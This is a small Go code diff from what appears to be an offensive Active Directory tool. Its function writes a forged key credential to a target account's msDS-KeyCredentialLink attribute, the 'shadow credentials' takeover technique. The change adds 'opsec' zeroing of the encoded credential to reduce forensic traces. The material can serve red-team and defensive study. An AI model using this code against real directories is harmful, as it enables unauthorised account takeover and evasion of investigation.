@@ -214,8 +214,11 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	}
 
 	// Format DN-Binary value: B:<hexlen>:<hex>:<ownerDN>
-	credHex := hex.EncodeToString(credential)
-	dnBinaryValue := fmt.Sprintf("B:%d:%s:%s", len(credHex), credHex, targetDN)
+	// opsec: use byte slice for hex encoding so we can zero it
+	credHexBuf := make([]byte, hex.EncodedLen(len(credential)))
+	hex.Encode(credHexBuf, credential)
+	defer structs.ZeroBytes(credHexBuf)
+	dnBinaryValue := fmt.Sprintf("B:%d:%s:%s", len(credHexBuf), credHexBuf, targetDN)
 
 	// Write to msDS-KeyCredentialLink (ADD operation to preserve existing values)
 	modReq := ldap.NewModifyRequest(targetDN, nil)
